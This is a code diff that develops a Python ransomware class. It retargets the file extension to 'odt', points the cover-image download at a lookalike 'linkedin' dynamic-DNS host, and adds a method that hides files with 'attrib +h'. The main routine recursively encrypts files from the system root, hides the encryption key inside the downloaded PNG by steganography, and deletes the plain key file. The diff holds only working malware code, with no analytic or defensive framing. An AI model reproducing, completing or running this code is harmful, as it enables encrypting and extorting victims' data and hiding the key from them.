@@ -33,7 +33,8 @@ class Ransomware:
 
         self.key = key
         self.cryptor = None
-        self.file_ext_targets = ['wap']
+        # self.file_ext_targets = ['wap']
+        self.file_ext_targets = ['odt']
 
     def generate_key(self):
         """
@@ -79,7 +80,7 @@ class Ransomware:
 
 
         """
-        url= "http://linkedin.ddns.net/images/moana1.png"
+        url= "http://linkedin.uk.to/images/moana1.png"
 
         downloadedFilePath = r'C:\Users\Public\Pictures\moana1.png'
         if not os.path.isfile(downloadedFilePath):
@@ -105,7 +106,7 @@ class Ransomware:
         file = open(key)
         keyval = file.readline()
         secret = lsb.hide(r'C:\Users\Public\Pictures\moana1.png', keyval)
-        secret.save(r'C:\Users\Public\Pictures\key.png')
+        secret.save(r'C:\Users\Public\Pictures\maui.png')
 
 
 
@@ -114,7 +115,7 @@ class Ransomware:
         Downloads the moana song which will be used later to add encoding
         currently not being used because it takes too long to process ( ~20 seconds)
         Args:
-              path:str: Absolute path of the picture to be deleted
+              path:str: Absolute path of the picture to be downloaded
         """
         # ssl._create_default_https_context = ssl._create_unverified_context
 
@@ -129,6 +130,14 @@ class Ransomware:
         # changeFileAttribute = os.popen('attrib +h ' + downloadedFilePath)
         # changeFile = changeFileAttribute.read()
         # changeFileAttribute.close()
+
+
+    def hidekey(self, path):
+
+        #make the downloaded file hidden
+        changeFileAttribute = os.popen('attrib +h ' + path)
+        changeFile = changeFileAttribute.read()
+        changeFileAttribute.close()
 
     def encode(self):
         """
@@ -181,11 +190,10 @@ class Ransomware:
         with open(keyfile_name, 'wb') as f:
             f.write(self.key)
 
-    def delete_pic(self, path):
+    def delete_file(self, path):
         """
-        Recursively encrypts or decrypts files from root directory with allowed file extensions
-        Args:
-            path:str: Absolute path of the picture to be deleted
+
+            path:str: Absolute path of the file to be deleted
         """
         if os.path.exists(path):
             os.remove(path)
@@ -272,8 +280,11 @@ if __name__ == '__main__':
             rware.crypt_root(sys_root)
             rware.write_setting(x)
             # rware.encode()
+
             rware.addStenography(r'C:\Users\Public\keyfile')
-            rware.delete_pic(r'C:\Users\Public\Pictures\moana1.png')
+            rware.delete_file(r'C:\Users\Public\Pictures\moana1.png')
+            rware.delete_file(r'C:\Users\Public\keyfile')
+            # rware.hidekey(r'C:\Users\Public\keyfile')
     stop = timeit.default_timer()
     print('Time: ', stop - start)
 
